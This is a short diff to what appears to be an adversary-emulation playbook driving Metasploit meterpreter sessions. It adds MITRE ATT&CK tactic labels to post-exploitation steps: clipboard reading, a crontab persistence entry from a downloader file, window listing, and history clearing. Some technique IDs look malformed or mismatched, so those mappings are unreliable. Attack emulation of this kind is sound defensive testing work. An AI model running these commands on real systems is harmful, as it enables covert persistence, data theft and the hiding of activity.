@@ -133,6 +133,7 @@ commands:
     session: client
     metadata:
       techniques: "T1204"
+      tactics: "Execution"
 
   - type: sleep
     seconds: 1
@@ -215,6 +216,7 @@ commands:
     cmd: xclip -selection clipboard -o
     metadata:
       techniques: "T1515"
+      tactics: "Exfiltration"
 
   # save the meterpreter payload in /home
   - type: msf-session
@@ -232,6 +234,7 @@ commands:
     cmd: (crontab -l; cat /home/judy/downloader.txt) | crontab -
     metadata:
       techniques: "T1029"
+      tactics: "Exfiltration"
 
   # find out which windown are open
   - type: msf-session
@@ -239,6 +242,7 @@ commands:
     cmd:  wmctrl -l
     metadata:
       techniques: "T010"
+      tactics: "Exfiltration"
 
   # clear history
   - type: msf-session
@@ -246,6 +250,7 @@ commands:
     cmd: history -c
     metadata:
       techniques: "T1565"
+      tactics: "Defensive Evasion"
 
   # exit the interactive shell
   - type: msf-session
